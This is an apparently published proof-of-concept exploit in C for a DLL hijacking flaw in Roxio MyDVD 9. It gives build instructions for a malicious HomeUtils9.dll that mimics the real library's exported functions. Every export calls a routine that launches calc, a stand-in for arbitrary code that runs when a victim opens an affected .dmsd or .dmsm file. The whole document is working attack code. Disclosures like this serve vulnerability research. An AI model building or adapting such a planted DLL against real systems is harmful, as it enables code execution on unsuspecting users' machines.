/*

Exploit Title: Roxio MyDVD 9 DLL Hijacking Exploit (HomeUtils9.dll)
Date: August 25, 2010
Author: storm (storm@gonullyourself.org)
Tested on: Windows Vista SP2

http://www.gonullyourself.org/

gcc -shared -o HomeUtils9.dll MyDVD9-DLL.c

.dmsd and .dmsm files are affected.

*/

#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void Dispatch_InvokeUpdate() { hax(); }
DllExport void GetCertificateItemValue() { hax(); }
DllExport void GetFeatureEnabled() { hax(); }
DllExport void GetFeatureEnabledGroup() { hax(); }
DllExport void GetFeatureGroup() { hax(); }
DllExport void GetFeatureGroupActivationDetail() { hax(); }
DllExport void GetRoxioKeyContents() { hax(); }
DllExport void LaunchPermission() { hax(); }
DllExport void LaunchPermission_Str() { hax(); }
DllExport void SAR_Dispatch_ActivateComponent() { hax(); }
DllExport void SAR_Dispatch_ActivateProduct() { hax(); }
DllExport void SAR_Dispatch_ActivateProductGroup() { hax(); }
DllExport void SAR_Dispatch_DoRegister() { hax(); }
DllExport void SAR_Dispatch_GetActivationDetail() { hax(); }
DllExport void SAR_Dispatch_IncrementUsage() { hax(); }
DllExport void SAR_Dispatch_IsActivated() { hax(); }
DllExport void SAR_Dispatch_IsRegistered() { hax(); }
DllExport void SAR_Dispatch_ReleaseActivation() { hax(); }
DllExport void SAR_GetCDKey() { hax(); }
DllExport void SAR_UsePermissionsCache() { hax(); }
DllExport void Upgrade() { hax(); }
DllExport void UseCodecPermission() { hax(); }

int hax()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}